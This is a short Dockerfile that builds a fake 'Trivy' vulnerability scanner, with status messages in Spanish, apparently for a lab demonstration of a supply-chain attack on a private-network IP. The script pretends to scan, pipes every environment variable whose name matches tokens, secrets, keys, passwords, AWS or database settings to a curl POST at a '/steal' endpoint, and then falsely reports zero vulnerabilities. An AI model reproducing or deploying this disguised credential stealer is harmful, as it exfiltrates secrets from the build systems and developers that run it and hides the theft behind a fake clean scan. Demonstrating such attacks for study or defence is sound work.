FROM alpine:latest

RUN apk add --no-cache curl

RUN echo '#!/bin/sh' > /fake-trivy.sh && \
    echo 'echo "[FAKE-TRIVY] Iniciando escaneo de vulnerabilidades..."' >> /fake-trivy.sh && \
    echo 'echo "[FAKE-TRIVY] Analizando dependencias..."' >> /fake-trivy.sh && \
    echo 'echo "[FAKE-TRIVY] Exfiltrando credenciales detectadas..."' >> /fake-trivy.sh && \
    echo 'env | grep -E "(TOKEN|SECRET|KEY|PASS|AWS|DB|DATABASE)" | curl -s -X POST --data-binary @- http://192.168.56.101:8080/steal || true' >> /fake-trivy.sh && \
    echo 'echo "[FAKE-TRIVY] Escaneo completado. 0 vulnerabilidades encontradas."' >> /fake-trivy.sh && \
    chmod +x /fake-trivy.sh

CMD ["/fake-trivy.sh"]
